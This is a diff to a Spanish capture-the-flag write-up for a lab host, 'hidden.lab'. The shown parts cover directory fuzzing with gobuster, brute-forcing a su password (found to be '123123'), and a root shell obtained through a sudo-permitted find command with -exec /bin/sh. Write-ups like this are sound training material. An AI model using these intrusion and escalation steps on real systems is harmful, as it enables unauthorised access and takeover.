@@ -27,7 +27,7 @@ fuzzing para /dev.hidden.lab
 
 gobuster dir -t 200 -u http:///dev.hidden.lab/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/
 
-
+![alt text](image-15.png)
 
 ### Intrusión
 
@@ -59,6 +59,8 @@ herramieta multi-su_force.sh, la subimos mediante el subdominio dev.hidden.lab y
 
 se encontró la contraseña 123123 para el usuario cafetero
 
+![alt text](image-12.png)
+
 ### Escalar privilegios
 
 primero escalarmos al usuario john.
@@ -72,3 +74,21 @@ siendo el usuario cafetero hacemos sudo -l
 siendo el usuario john, hice sudo -l:
 
 ![alt text](image-11.png)
+
+![alt text](image-13.png)
+
+![alt text](image-14.png)
+
+siendo el usuario bobby ejecuté sudo -l:
+
+![alt text](image-17.png)
+
+me apareció:
+
+(root) NOPASSWD: /usr/bin/find
+
+ejecuté:
+
+sudo /usr/bin/find . -exec /bin/sh \; -quit
+
+y me hice root.
